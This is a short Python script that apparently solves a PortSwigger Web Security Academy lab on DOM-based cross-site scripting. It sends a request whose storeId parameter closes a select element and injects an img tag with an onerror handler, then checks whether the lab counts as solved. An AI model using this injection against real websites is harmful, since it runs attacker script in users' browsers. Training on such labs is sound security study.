#https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

from utils import *

url="https://0a8b009d0349f7ca8241385300c2006c.web-security-academy.net/"

payload='product?productId=5&storeId="></select><img%20src=1%20onerror=alert(1)>'

response=requests.get(url+payload)

print(check_succes(parse_html(response)))
